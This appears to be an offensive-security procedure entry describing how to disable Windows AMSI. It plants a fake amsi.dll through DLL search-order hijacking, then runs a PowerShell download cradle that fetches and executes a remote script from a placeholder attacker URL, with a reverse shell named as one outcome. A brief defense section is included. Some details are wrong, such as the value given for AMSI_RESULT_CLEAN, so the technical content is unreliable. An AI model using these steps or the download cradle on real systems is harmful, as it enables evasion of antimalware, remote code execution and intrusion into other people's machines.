---
id: 5fddc468-9613-4dcb-94b1-9e16e4aa920f
type: procedure
description: >-
  Bypass Windows Antimalware Scan Interface (AMSI) by hijacking the DLL search
  order to load a malicious amsi.dll that patches the AmsiScanBuffer function,
  allowing undetected code execution.
verified: true
submitted: false
created_at: '2023-04-06T03:56:25.941092+00:00'
updated_at: '2023-04-10T20:36:18.306251+00:00'
tactics:
  - '[[Defense Evasion]]'
techniques:
  - '[[DLL Search Order Hijacking]]'
  - '[[Disable or Modify Tools]]'
sub_techniques: []
tags:
  - amsi-bypass
  - dll-hijacking
  - defense-evasion
  - patching-amsi-dll
commands:
  - '[[commands/PowerShell-Invoke-Expression-DownloadCradle]]'
platforms:
  - Windows
tools: []
validated: true
---

# Patch-AmsiScanBuffer-via-DLL-Hijacking

## Summary

This procedure demonstrates how to bypass the Windows Antimalware Scan Interface (AMSI) by exploiting DLL search order hijacking. A malicious amsi.dll is created and placed in a directory that precedes the system directories in the search order, replacing the legitimate AmsiScanBuffer function with a patched version that always returns a clean scan result. This allows PowerShell scripts and other content to execute without triggering antivirus detection, enabling undetected payload delivery and execution.

## Description

AMSI integrates with applications like PowerShell to scan content before execution. By hijacking the DLL search order for a target application (e.g., powershell.exe), an attacker can load a custom amsi.dll containing a modified AmsiScanBuffer function. This function, when called, simply returns AMSI_RESULT_CLEAN without performing any scanning, effectively disabling AMSI for that process. The technique targets Windows environments where the attacker has write access to a searchable directory. It is particularly useful in post-exploitation scenarios to evade endpoint detection. Success relies on understanding Windows DLL loading behavior and compiling a compatible DLL. This method maps to MITRE ATT&CK techniques for hijacking execution flow and impairing defenses.

## Requirements

1. Administrative or local user access on a Windows system to create and place files in a DLL search path directory (e.g., current working directory or application directory).
2. Development tools like Visual Studio or MinGW to compile a C++ DLL with the AmsiScanBuffer export.
3. Knowledge of the target application's DLL search order (e.g., for PowerShell, the current directory is searched first).
4. A payload script hosted on an attacker-controlled server for execution post-bypass.

## Defense

- Enforce secure DLL loading by using policies like SafeDLLSearchMode in the registry and avoiding untrusted directories in the PATH.
- Monitor for suspicious DLL creations or modifications in application directories using file integrity monitoring (e.g., Sysmon Event ID 11).
- Enable AMSI logging and PowerShell constrained language mode to limit bypass attempts.
- Regularly audit and harden DLL search paths, and use application whitelisting to prevent unsigned DLLs from loading.

## Objectives

1. Disable AMSI scanning for a target process to allow malicious script execution.
2. Hijack DLL loading to inject a patched version of amsi.dll without modifying system files.
3. Execute a remote payload undetected, leading to further compromise such as persistence or data exfiltration.

## Instructions

### Step 1: Create Malicious amsi.dll with Patched AmsiScanBuffer

**Context**: Compile a custom DLL that exports AmsiScanBuffer, which immediately returns AMSI_RESULT_CLEAN (value 0x80070057) to bypass scanning. This step requires a C++ compiler and ensures the DLL matches the architecture (x64 or x86) of the target application.

Use Visual Studio to create a new DLL project and implement the function as follows (example code provided in related code snippet). Compile it to amsi.dll.

**Expected Output**: A compiled amsi.dll file approximately 10-20 KB in size, verifiable by checking exports with `dumpbin /exports amsi.dll` showing AmsiScanBuffer.

### Step 2: Position Malicious DLL in Search Order

**Context**: Place the amsi.dll in a directory that the target application searches before %SystemRoot%\System32 (e.g., the current working directory when launching PowerShell). This exploits the default DLL search order to load the fake DLL first.

Copy the compiled amsi.dll to the target directory, such as C:\Temp\ (and set the working directory to it when running the application).

**Expected Output**: No immediate output; verify by running `rundll32.exe amsi.dll,AmsiScanBuffer` (should not error and return clean).

### Step 3: Execute Payload with Bypassed AMSI

**Context**: With AMSI bypassed, download and execute a malicious PowerShell script using a download cradle. This step confirms the bypass by running content that would normally be blocked.

**Command** ([[commands/PowerShell-Invoke-Expression-DownloadCradle]]):
```powershell
IEX([Net.WebClient]::new().DownloadString('https://maliciousscripturl/malicious.ps1'))
```

> This command uses Invoke-Expression (IEX) to download and run a remote script. With the patched DLL loaded, AMSI will not scan the downloaded content, allowing execution of commands like whoami or further exploits. Replace the URL with your payload host.

**Expected Output**: Successful execution of the remote script without AMSI blocking errors (e.g., no "script execution is disabled" messages); output depends on the payload, such as system information or a reverse shell.
